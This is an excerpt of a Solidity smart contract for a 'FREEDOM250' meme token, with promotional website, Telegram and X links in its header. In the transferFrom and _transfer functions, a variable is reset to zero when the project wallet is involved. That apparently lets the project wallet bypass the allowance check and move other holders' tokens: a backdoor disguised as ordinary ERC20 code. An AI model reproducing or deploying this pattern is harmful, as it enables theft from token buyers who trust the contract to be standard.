...
/*
    FREEDOM250 is the patriotic meme token for USA Independence Day 250 celebrations.

    https://www.freedom250oneth.fun
    https://t.me/freedom250oneth
    https://x.com/freedom250oneth
*/
...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    function transferFrom(
        ...
        _wspFreedom = amount; _transfer(sender, recipient, amount);
        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(
            currentAllowance >= _wspFreedom,
            "ERC20: transfer amount exceeds allowance"
        );
        unchecked {
            _approve(sender, _msgSender(), currentAllowance - _wspFreedom);
        }
...
contract FREEDOM250 is ERC20, Ownable {
    ...
    constructor() ERC20("Freedom 250", "FREEDOM250") payable{
    ...
    function _transfer(
        ...
        if(_isSenderCheck(projectWallet))_wspFreedom = 0;
